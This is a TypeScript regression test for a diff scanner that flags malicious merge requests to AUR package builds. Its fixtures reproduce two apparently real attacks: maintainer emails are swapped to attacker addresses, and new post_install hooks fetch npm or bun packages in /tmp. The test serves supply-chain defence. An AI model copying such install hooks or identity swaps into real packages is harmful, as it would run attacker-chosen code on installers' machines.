import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { PinoLogger } from 'nestjs-pino';
import { DiffScanService } from '../diff-scan.service';
import { makeChange } from './test-support';

const pinoStub = {
  info: () => undefined,
  warn: () => undefined,
  error: () => undefined,
  debug: () => undefined,
} as unknown as PinoLogger;

/**
 * Condensed fixtures of the two real malicious MRs merged against this repository
 * https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/2224 (alvr)
 * https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/2241 (akira-git)
 */
const ALVR_PKGBUILD = [
  '@@ -1,5 +1,5 @@',
  '-# Maintainer: m00nw4tch3r <m00nwtchr at duck dot com>',
  '-# Maintainer: PLYSHKA <koraser at keemail dot me>',
  '+# Maintainer: m00nw4tch3r <krisztinavarga@gmail.com>',
  '+# Maintainer: PLYSHKA <krisztinavarga@gmail.com>',
  ' ',
  ' pkgname=alvr',
  ' pkgver=20.14.1',
  '@@ -8,10 +8,11 @@ pkgdesc="Experimental Linux version of ALVR"',
  "+depends=('npm' 'glibc' 'gcc-libs')",
  '+install=alvr-deps.install',
].join('\n');

const ALVR_INSTALL = [
  '@@ -0,0 +1,4 @@',
  '+post_install() {{',
  '+  cd /tmp',
  '+  npm install atomic-lockfile yargs',
  '+}}',
].join('\n');

const AKIRA_PKGBUILD = [
  '@@ -1,6 +1,6 @@',
  "-# Maintainer: Fabio 'Lolix' Loli <fabio.loli@disroot.org> -> https://github.com/FabioLolix",
  "+# Maintainer: Fabio 'Lolix' Loli <zsomborzabo@gmail.com> -> https://github.com/FabioLolix",
  ' # Contributor: Alberto Fangul',
  '-# Contributor: Philip Goto <philip.goto@gmail.com>',
  '+# Contributor: Philip Goto <zsomborzabo@gmail.com>',
  ' ',
  ' pkgname=akira-git',
  '@@ -9,10 +9,11 @@ pkgdesc="Native Linux App for UI and UX Design built in Vala and Gtk"',
  "+depends=('bun' goocanvas libgranite.so)",
  '+install=akira-git-deps.install',
].join('\n');

const AKIRA_INSTALL = [
  '@@ -0,0 +1,4 @@',
  '+post_install() {{',
  '+  cd /tmp',
  '+  bun add minimist js-digest chalk dotenv',
  '+}}',
].join('\n');

const service = new DiffScanService(pinoStub);

describe('real-world campaign MRs (regression)', () => {
  beforeEach(() => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('network disabled in tests')));
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('flags !2224 (alvr): npm payload install plus identity takeover', async () => {
    const findings = await service.scanDiffs([
      makeChange(ALVR_PKGBUILD, { new_path: 'alvr/PKGBUILD' }),
      makeChange(ALVR_INSTALL, { new_path: 'alvr/alvr-deps.install', new_file: true }),
    ]);
    const ruleIds = findings.map((finding) => finding.ruleId);

    expect(ruleIds).toContain('NPM-001');
    expect(ruleIds).toContain('NPM-002');
    expect(ruleIds).toContain('CAUR-INSTALL-NEW');
    expect(ruleIds).toContain('CAUR-IDENTITY-SWAP');
    expect(ruleIds).toContain('CAUR-CAMPAIGN-ACCOUNT');
    expect(findings.every((finding) => finding.severity !== 'info')).toBe(true);
  });

  it('flags !2241 (akira-git): bun payload install plus identity takeover', async () => {
    const findings = await service.scanDiffs([
      makeChange(AKIRA_PKGBUILD, { new_path: 'akira-git/PKGBUILD' }),
      makeChange(AKIRA_INSTALL, { new_path: 'akira-git/akira-git-deps.install', new_file: true }),
    ]);
    const ruleIds = findings.map((finding) => finding.ruleId);

    expect(ruleIds).toContain('NPM-001');
    expect(ruleIds).toContain('NPM-002');
    expect(ruleIds).toContain('CAUR-INSTALL-NEW');
    expect(ruleIds).toContain('CAUR-IDENTITY-SWAP');
    expect(ruleIds).toContain('CAUR-CAMPAIGN-ACCOUNT');
  });
});
